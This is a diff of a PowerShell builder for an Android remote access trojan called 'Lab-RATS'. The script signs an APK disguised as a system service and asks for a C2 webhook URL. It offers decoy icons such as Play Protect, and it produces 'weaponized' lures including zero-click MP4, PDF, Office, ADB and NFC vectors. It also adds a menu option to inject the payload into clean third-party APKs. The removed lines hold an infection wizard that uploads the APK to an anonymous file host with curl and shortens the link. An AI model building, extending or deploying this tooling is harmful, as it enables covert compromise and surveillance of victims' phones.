@@ -1,51 +1,20 @@
-#################################################
-#                   Lab-RATS                    #
-#                                               #
-#        Android APK BUILDER - PowerShell       #
-#                v1.5.1 Hardened                #
-#                                               #
-#             Developed by: K4N3CO              #
-#################################################
+# ====================================================================
+#                   Lab-RATS PowerShell Builder
+#                         v1.5.1 Hardened
+# ====================================================================
+# Developed by K4N3CO © 2026
 
-$ErrorActionPreference = "Continue"
+Param(
+    [string]$TargetApk
+)
 
-# Script paths
+$ErrorActionPreference = "Stop"
 $ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
 $ProjectDir = Split-Path -Parent $ScriptDir
-$ConfigFile = Join-Path $ScriptDir "build_config.txt"
-
-# Default settings
-$DefaultSettings = @{
-    KeyAlias = "lab-rats-key"
-    KeystorePass = "lab-rats123"
-    AppName = "System Stability Service"
-    VersionName = "2.0"
-    VersionCode = 20
-}
 
 function Write-Banner {
     Clear-Host
     Write-Host " ┌───────────────────────────────────────────────────────────────────────┐" -ForegroundColor Cyan
-    Write-Host " │                                  .-         .                         │" -ForegroundColor Cyan
-    Write-Host " │                               ....-        :                          │" -ForegroundColor Cyan
-    Write-Host " │                            -==--+:.+. ..  -..+:-+                     │" -ForegroundColor Cyan
-    Write-Host " │                            ++---:+.-==+==#:.+---+#                    │" -ForegroundColor Cyan
-    Write-Host " │                             :=---:+++++=++=**-:-:                     │" -ForegroundColor Cyan
-    Write-Host " │                               --+++:-=+++++++-=                       │" -ForegroundColor Cyan
-    Write-Host " │                  .-.         :--+==:++-:-**+-+-                       │" -ForegroundColor Cyan
-    Write-Host " │                    -.     .==:--+:+++=++++++++#.                      │" -ForegroundColor Cyan
-    Write-Host " │                    :-    =---=::-++.=:.=.-==+....                     │" -ForegroundColor Cyan
-    Write-Host " │                   -+   .=-=++===-:.---=::-.-:==...-.==.               │" -ForegroundColor Cyan
-    Write-Host " │                 .==    =--=:=-=++:+:--::-==--...=+-+=+-:              │" -ForegroundColor Cyan
-    Write-Host " │               ..==.   ---++=:-++++++++===+++=+..:=-*-+:.              │" -ForegroundColor Cyan
-    Write-Host " │                :==    -:-.+:-=++-+++++##++=---=++::=+.                │" -ForegroundColor Cyan
-    Write-Host " │                .-=:  .---=++++-++++#####*++..::--. .                  │" -ForegroundColor Cyan
-    Write-Host " │                 .--++.--:----=+---=-++#++==.       .                  │" -ForegroundColor Cyan
-    Write-Host " │                   --------=--:=:-:-====+++-                           │" -ForegroundColor Cyan
-    Write-Host " │                       .--++++--++:+++==:=+.                           │" -ForegroundColor Cyan
-    Write-Host " │                        .:+++::::--:..:-+=                             │" -ForegroundColor Cyan
-    Write-Host " │                       .--=+=-+-+    -:---*---                         │" -ForegroundColor Cyan
-    Write-Host " │                                                                       │" -ForegroundColor Cyan
     Write-Host " │     ██╗      █████╗ ██████╗       ██████╗  █████╗ ████████╗██████╗    │" -ForegroundColor Cyan
     Write-Host " │     ██║     ██╔══██╗██╔══██╗      ██╔══██╗██╔══██╗╚══██╔══╝██╔═══╝    │" -ForegroundColor Cyan
     Write-Host " │     ██║     ███████║██████╔╝█████╗██████╔╝███████║   ██║   ██████╗    │" -ForegroundColor Cyan
@@ -54,10 +23,7 @@ function Write-Banner {
     Write-Host " │     ╚══════╝╚═╝  ╚═╝╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═════╝    │" -ForegroundColor Cyan
     Write-Host " │                                                                       │" -ForegroundColor Cyan
     Write-Host " │     ----------> Android APK Builder | v1.5.1 Hardened <----------     │" -ForegroundColor Cyan
-    Write-Host " │                                                                       │" -ForegroundColor Cyan
-    Write-Host " │   The one's who MIND don't matter. The one's who MATTER don't mind.   │" -ForegroundColor Cyan
     Write-Host " │                         DEVELOPED BY K4N3CO                           │" -ForegroundColor Cyan
-    Write-Host " │                               © 2026                                  │" -ForegroundColor Cyan
     Write-Host " └───────────────────────────────────────────────────────────────────────┘" -ForegroundColor Cyan
     Write-Host ""
 }
@@ -65,121 +31,83 @@ function Write-Banner {
 function Test-Requirements {
     Write-Host "[*] Checking requirements..." -ForegroundColor Cyan
 
-    # Java check
-    if (Get-Command java -ErrorAction SilentlyContinue) {
-        $javaVer = java -version 2>&1 | Select-Object -First 1
-        Write-Host "[OK] Java detected: $javaVer" -ForegroundColor Green
-    } else {
-        Write-Host "[!] Java is missing. Please install JDK 17 or 21." -ForegroundColor Red
+    if (-not (Get-Command java -ErrorAction SilentlyContinue)) {
+        Write-Host "[!] Java JDK 17/21 is required." -ForegroundColor Red
         return $false
     }
-    
-    # Gradle check
-    $gradlew = Join-Path $ProjectDir "gradlew.bat"
-    if (-not (Test-Path $gradlew)) {
-        Write-Host "[!] gradlew.bat not found in $ProjectDir" -ForegroundColor Red
-        return $false
-    }
-    
+    Write-Host "[OK] Java detected" -ForegroundColor Green
     return $true
 }
 
 function New-Keystore {
-    param([bool]$AutoGenerate = $false)
-    
     $keystorePath = Join-Path $ProjectDir "lab-rats-keystore.jks"
-    if ((Test-Path $keystorePath) -and -not $AutoGenerate) {
-        $choice = Read-Host "    Keystore already exists. Regenerate? (y/N)"
+    if (Test-Path $keystorePath) {
+        Write-Host "[!] Keystore already exists." -ForegroundColor Yellow
+        $choice = Read-Host "    Generate new keystore? (y/N)"
         if ($choice -notmatch "[yY]") { return }
         Remove-Item $keystorePath -Force
     }
-    
-    Write-Host "[*] Generating signing keystore..." -ForegroundColor Cyan
-    $pass = $DefaultSettings.KeystorePass
-    $alias = $DefaultSettings.KeyAlias
-    
-    $dname = "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US"
-    & keytool -genkeypair -alias $alias -keyalg RSA -keysize 2048 -validity 9125 -keystore $keystorePath -storepass $pass -keypass $pass -dname $dname 2>$null
-    
-    $propsPath = Join-Path $ProjectDir "keystore.properties"
-    $propsContent = "storeFile=lab-rats-keystore.jks`nstorePassword=$pass`nkeyAlias=$alias`nkeyPassword=$pass"
-    Set-Content $propsPath $propsContent
-    
-    Write-Host "[OK] Keystore ready: $keystorePath" -ForegroundColor Green
+
+    $alias = Read-Host "    Key alias [lab-rats-key]"
+    if ([string]::IsNullOrEmpty($alias)) { $alias = "lab-rats-key" }
+    $pass = Read-Host "    Password [lab-rats123]"
+    if ([string]::IsNullOrEmpty($pass)) { $pass = "lab-rats123" }
+
+    & keytool -genkeypair -alias $alias -keyalg RSA -keysize 2048 -validity 9125 -keystore $keystorePath -storepass $pass -keypass $pass -dname "CN=Lab-RATS Developer, O=Lab-RATS.LABS, C=US" 2>$null
+
+    $props = "storeFile=lab-rats-keystore.jks`nstorePassword=$pass`nkeyAlias=$alias`nkeyPassword=$pass"
+    Set-Content (Join-Path $ProjectDir "keystore.properties") $props
+    Write-Host "[OK] Keystore ready" -ForegroundColor Green
 }
 
 function Set-AppConfig {
-    Write-Banner
     Write-Host "[*] App Configuration" -ForegroundColor Cyan
-    Write-Host ""
-
     $appName = Read-Host "    Enter App Name [System Stability Service]"
-    if ([string]::IsNullOrEmpty($appName)) { $appName = $DefaultSettings.AppName }
+    if ([string]::IsNullOrEmpty($appName)) { $appName = "System Stability Service" }
     
     $pkgName = Read-Host "    Enter Package ID [com.android.system.stability]"
     if ([string]::IsNullOrEmpty($pkgName)) { $pkgName = "com.android.system.stability" }
-    
-    $verName = Read-Host "    Enter Version Name [2.0]"
-    if ([string]::IsNullOrEmpty($verName)) { $verName = $DefaultSettings.VersionName }
-    
+
+    $verName = Read-Host "    Enter Version Name [1.0.0]"
+    if ([string]::IsNullOrEmpty($verName)) { $verName = "1.0.0" }
+
     $minSdk = Read-Host "    Enter Min SDK [21]"
     if ([string]::IsNullOrEmpty($minSdk)) { $minSdk = 21 }
 
-    # Decoy Identity Selection
-    Write-Host ""
-    Write-Host "[*] Decoy Identity Selection" -ForegroundColor Cyan
-    Write-Host "    (The app logo will transform into your selection immediately after install on device)" -ForegroundColor Yellow
+    Write-Host "`n[*] Decoy Identity Selection" -ForegroundColor Cyan
     Write-Host "    1. System Update (Gear)  2. Calculator"
-    Write-Host "    3. Weather               4. Settings"
+    Write-Host "    3. Weather               4. Play Protect"
     Write-Host "    5. Lab-RATS Logo"
-    Write-Host ""
     $decoyChoice = Read-Host "    Choice (Default 1)"
     if ([string]::IsNullOrEmpty($decoyChoice)) { $decoyChoice = "1" }
 
-    # Update build.gradle
-    $buildGradle = Join-Path $ProjectDir "app\build.gradle"
-    if (Test-Path $buildGradle) {
-        $content = Get-Content $buildGradle -Raw
-        $content = $content -replace 'applicationId "[^"]+"', "applicationId `"$pkgName`""
-        $content = $content -replace 'versionName "[^"]+"', "versionName `"$verName`""
-        $content = $content -replace 'minSdk \d+', "minSdk $minSdk"
-        Set-Content $buildGradle $content
-    }
-
-    # Update strings.xml
-    $stringsXml = Join-Path $ProjectDir "app\src\main\res\values\strings.xml"
-    if (Test-Path $stringsXml) {
-        $content = Get-Content $stringsXml -Raw
-        $content = $content -replace '<string name="app_name">[^<]+</string>', "<string name=`"app_name`">$appName</string>"
-        Set-Content $stringsXml $content
-    }
-
-    # Update local.properties
     $localProps = Join-Path $ProjectDir "local.properties"
-    $webhookUrl = Read-Host "    Enter C2 Webhook URL (Google Script or Render)"
-    
-    $props = ""
-    if (Test-Path $localProps) { $props = Get-Content $localProps }
-    
-    $newProps = @()
-    $foundWebhook = $false
-    $foundDecoy = $false
-
-    foreach ($line in $props) {
-        if ($line -like "WEBHOOK_URL=*") {
-            $newProps += "WEBHOOK_URL=$webhookUrl"
-            $foundWebhook = $true
-        } elseif ($line -like "DECOY_CHOICE=*") {
-            $newProps += "DECOY_CHOICE=$decoyChoice"
-            $foundDecoy = $true
-        } else {
-            $newProps += $line
+    $existingWebhook = ""
+    if (Test-Path $localProps) {
+        $lines = Get-Content $localProps
+        foreach ($l in $lines) {
+            if ($l -like "WEBHOOK_URL=*") { $existingWebhook = $l.Split("=")[1] }
         }
     }
-    
-    if (-not $foundWebhook) { $newProps += "WEBHOOK_URL=$webhookUrl" }
-    if (-not $foundDecoy) { $newProps += "DECOY_CHOICE=$decoyChoice" }
-    
+
+    if ($existingWebhook) {
+        Write-Host "    Current Webhook URL: $existingWebhook" -ForegroundColor Yellow
+        $webhookUrl = Read-Host "    Enter C2 Webhook URL [Press Enter to Keep Current]"
+        if ([string]::IsNullOrEmpty($webhookUrl)) { $webhookUrl = $existingWebhook }
+    } else {
+        $webhookUrl = Read-Host "    Enter C2 Webhook URL (Google Script or Render)"
+    }
+
+    $newProps = @()
+    if (Test-Path $localProps) {
+        foreach ($line in Get-Content $localProps) {
+            if ($line -notlike "WEBHOOK_URL=*" -and $line -notlike "DECOY_CHOICE=*") {
+                $newProps += $line
+            }
+        }
+    }
+    $newProps += "WEBHOOK_URL=$webhookUrl"
+    $newProps += "DECOY_CHOICE=$decoyChoice"
     Set-Content $localProps ($newProps -join "`n")
 
     Write-Host "[OK] Configuration applied" -ForegroundColor Green
@@ -191,7 +119,7 @@ function Build-Apk {
 
     Set-Location $ProjectDir
     & .\gradlew.bat clean assembleRelease --no-daemon
-    
+
     $outputDir = Join-Path $ScriptDir "output"
     if (-not (Test-Path $outputDir)) { New-Item -ItemType Directory -Path $outputDir | Out-Null }
 
@@ -200,25 +128,23 @@ function Build-Apk {
         Copy-Item $apkPath (Join-Path $outputDir "signed_v1.apk") -Force
         Write-Host "`n[OK] Build successful: apk-builder/output/signed_v1.apk" -ForegroundColor Green
     } else {
-        Write-Host "`n[!] Build failed. Check build_log.txt" -ForegroundColor Red
+        Write-Host "`n[!] Build failed." -ForegroundColor Red
     }
-    
+
     Set-Location $ScriptDir
     Read-Host "    Press Enter to continue"
 }
 
-function New-ExploitStandalone {
-    param($Type, $Url, $Extra)
-
+function New-ExploitStandalone([string]$Type, [string]$Url, [string]$Extra) {
     $exploitSrc = Join-Path $ProjectDir "app\src\main\java\com\labs\labrats\exploits\ExploitLab.java"
     $tempBin = Join-Path $ScriptDir "bin"
     if (-not (Test-Path $tempBin)) { New-Item -ItemType Directory -Path $tempBin | Out-Null }
 
-    Write-Host "[*] Compiling Exploit Generator..." -ForegroundColor Cyan
-    & javac -sourcepath (Join-Path $ProjectDir "app\src\main\java") -d $tempBin $exploitSrc
-
+    & javac -sourcepath (Join-Path $ProjectDir "app\src\main\java") -d $tempBin $exploitSrc 2>$null
     if ($LASTEXITCODE -eq 0) {
-        Set-Location (Join-Path $ScriptDir "output")
+        $outDir = Join-Path $ScriptDir "output"
+        if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Path $outDir | Out-Null }
+        Set-Location $outDir
         & java -cp $tempBin com.labs.labrats.exploits.ExploitLab $Type $Url $Extra
         Set-Location $ScriptDir
     } else {
@@ -226,81 +152,16 @@ function New-ExploitStandalone {
     }
 }
 
-function Invoke-InfectionWizard {
-    Write-Banner
-    Write-Host "[>] STRATEGIC_INFECTION_WIZARD" -ForegroundColor Red
-    Write-Host "    Step-by-step automated payload weaponization." -ForegroundColor Yellow
-    Write-Host ""
-
-    if (-not (Test-Requirements)) { return }
-    New-Keystore -AutoGenerate $true
-    Set-AppConfig
-    Build-Apk
-
-    $downloadUrl = ""
-    Write-Host ""
-    Write-Host "[HOSTING] Select strategy:" -ForegroundColor Cyan
-    Write-Host "    1. Anonymous Cloud (Catbox)  2. Direct IP (IPv6)"
-    $h = Read-Host "    Choice"
-
-    if ($h -eq "2") {
-        $ip = Read-Host "    Target IPv6"
-        $downloadUrl = "http://[$ip]:9191/download/Update.apk"
-    } else {
-        Write-Host "[*] Uploading to Catbox.moe..." -ForegroundColor Yellow
-        $signedApk = Join-Path $ScriptDir "output\signed_v1.apk"
-        $resp = curl.exe -sS -F "reqtype=fileupload" -F "fileToUpload=@$signedApk" https://catbox.moe/user/api.php
-        if ($resp -match "http") {
-            $downloadUrl = $resp.Trim()
-            Write-Host "[OK] Hosted: $downloadUrl" -ForegroundColor Green
-
-            $short = curl.exe -s "https://is.gd/create.php?format=simple&url=$downloadUrl"
-            if ($short -match "http") {
-                $downloadUrl = $short.Trim()
-                Write-Host "[OK] Shortened: $downloadUrl" -ForegroundColor Green
-            }
-        } else {
-            Write-Host "[!] Upload failed: $resp" -ForegroundColor Red
-            Read-Host "    Press Enter to return"
-            return
-        }
-    }
-
-    Write-Host ""
-    Write-Host "[WEAPONIZE] Select Vector:" -ForegroundColor Cyan
-    Write-Host "    1. Zero-Click MP4  2. Stealth PDF  3. Meeting Invite"
-    Write-Host "    4. Dolby Audio     5. ADB Script    6. Bluetooth/NFC"
-    Write-Host "    7. Stego Image     8. PWA Bundle    9. Office Word"
-    Write-Host "    10. Office Excel   11. Ghost GIF (Zero-Click)"
-    $v = Read-Host "    Choice"
-
-    switch ($v) {
-        "1" { New-ExploitStandalone "mp4" $downloadUrl "" }
-        "2" { New-ExploitStandalone "pdf" $downloadUrl "Security_Audit" }
-        "3" { New-ExploitStandalone "ics" $downloadUrl "Security_Sync" }
-        "4" { New-ExploitStandalone "dolby" $downloadUrl "" }
-        "5" { $tip = Read-Host "    Target IP"; New-ExploitStandalone "adb" $downloadUrl $tip }
-        "6" { New-ExploitStandalone "vcf" $downloadUrl "System_Update" }
-        "7" { New-ExploitStandalone "stego" $downloadUrl "" }
-        "8" { New-ExploitStandalone "pwa" $downloadUrl "System_Update" }
-        "9" { New-ExploitStandalone "docx" $downloadUrl "Security_Patch" }
-        "10" { New-ExploitStandalone "xlsx" $downloadUrl "Financial_Report" }
-        "11" { New-ExploitStandalone "gif" $downloadUrl "" }
-    }
-
-    Write-Host "`nDEPLOYMENT PACKAGE READY: $downloadUrl" -ForegroundColor Green
-    Read-Host "    Press Enter to return to menu"
-}
-
 function Show-ExploitLab {
     Write-Banner
     Write-Host "[>] Weaponized Payload Lab (Hardened Tier)" -ForegroundColor Magenta
     Write-Host ""
-    Write-Host "    1. Zero-Click MP4 (Media Heap Overflow)"
-    Write-Host "    2. Stealth PDF (URI Trigger Vector)"
-    Write-Host "    3. Calendar Injection (.ics System Alert)"
-    Write-Host "    4. PWA WebAPK Manifest & Service Worker"
-    Write-Host "    5. Return to Main Menu"
+    Write-Host "    1. Zero-Click MP4    2. Stealth PDF     3. Meeting Invite"
+    Write-Host "    4. Dolby Audio       5. ADB Script      6. Bluetooth Push"
+    Write-Host "    7. NFC NDEF Tag      8. Stego Image     9. PWA Bundle"
+    Write-Host "    10. Office Word      11. Office Excel   12. Ghost GIF"
+    Write-Host "    13. Priv-App Magisk Module ZIP"
+    Write-Host "    14. Return to Main Menu"
     Write-Host ""
     $e = Read-Host "    Choice"
 
@@ -317,8 +178,17 @@ function Show-ExploitLab {
         "1" { New-ExploitStandalone "mp4" $c2Url "" }
         "2" { $t = Read-Host "    Enter PDF Title"; New-ExploitStandalone "pdf" $c2Url $t }
         "3" { $s = Read-Host "    Enter Meeting Summary"; New-ExploitStandalone "ics" $c2Url $s }
-        "4" { New-ExploitStandalone "pwa" $c2Url "" }
-        "5" { return }
+        "4" { New-ExploitStandalone "dolby" $c2Url "" }
+        "5" { $ip = Read-Host "    Target IP"; New-ExploitStandalone "adb" $c2Url $ip }
+        "6" { New-ExploitStandalone "vcf" $c2Url "Android Update" }
+        "7" { New-ExploitStandalone "ndef" $c2Url "uri" }
+        "8" { New-ExploitStandalone "stego" $c2Url "" }
+        "9" { New-ExploitStandalone "pwa" $c2Url "SystemUpdate" }
+        "10" { New-ExploitStandalone "docx" $c2Url "Security_Audit" }
+        "11" { New-ExploitStandalone "xlsx" $c2Url "Financial_Report" }
+        "12" { New-ExploitStandalone "gif" $c2Url "" }
+        "13" { New-ExploitStandalone "privapp" $c2Url "" }
+        "14" { return }
     }
     Write-Host ""
     Read-Host "    Press Enter to return to Lab"
@@ -335,6 +205,7 @@ function Show-Help {
     Write-Host "4. Requirements: Check Java setup."
     Write-Host "5. Infection Wizard: Full Build -> Host -> Weaponize."
     Write-Host "6. Exploit Lab: Generate standalone tactical vectors."
+    Write-Host "7. Smali Surgery: Inject Lab-RATS payload into clean 3rd-party APK."
     Write-Host "------------------------------------------------------------"
     Read-Host "    Press Enter to return"
 }
@@ -348,23 +219,25 @@ function Show-MainMenu {
         Write-Host "    2. Generate Keystore Only"
         Write-Host "    3. Configure App Settings Only"
         Write-Host "    4. Check Requirements"
-        Write-Host "    5. Generate Infection Chain Package (Wizard)"
-        Write-Host "    6. Weaponized Payload Lab"
-        Write-Host "    7. Help / Documentation"
-        Write-Host "    8. Exit"
+        Write-Host "    5. Weaponized Payload Lab"
+        Write-Host "    6. Generate Infection Chain Package (Wizard)"
+        Write-Host "    7. Smali Surgery & APK Binder (Infect Clean APK)"
+        Write-Host "    8. Help / Documentation"
+        Write-Host "    9. Exit"
         Write-Host ""
-        $option = Read-Host "    Choose option (Default 1)"
-        if ([string]::IsNullOrEmpty($option)) { $option = "1" }
+        $choice = Read-Host "    Choice (Default 1)"
+        if ([string]::IsNullOrEmpty($choice)) { $choice = "1" }
 
-        switch ($option) {
-            "1" { if (Test-Requirements) { New-Keystore -AutoGenerate $true; Set-AppConfig; Build-Apk } }
+        switch ($choice) {
+            "1" { if (Test-Requirements) { New-Keystore; Set-AppConfig; Build-Apk } }
             "2" { if (Test-Requirements) { New-Keystore } }
             "3" { Set-AppConfig }
             "4" { Test-Requirements | Out-Null; Read-Host "    Press Enter to return" | Out-Null }
-            "5" { Invoke-InfectionWizard }
+            "5" { Show-ExploitLab }
             "6" { Show-ExploitLab }
-            "7" { Show-Help }
-            "8" { exit 0 }
+            "7" { & powershell -ExecutionPolicy Bypass -File (Join-Path $ScriptDir "bind.ps1"); Read-Host "    Press Enter to return" }
+            "8" { Show-Help }
+            "9" { exit 0 }
         }
     }
 }
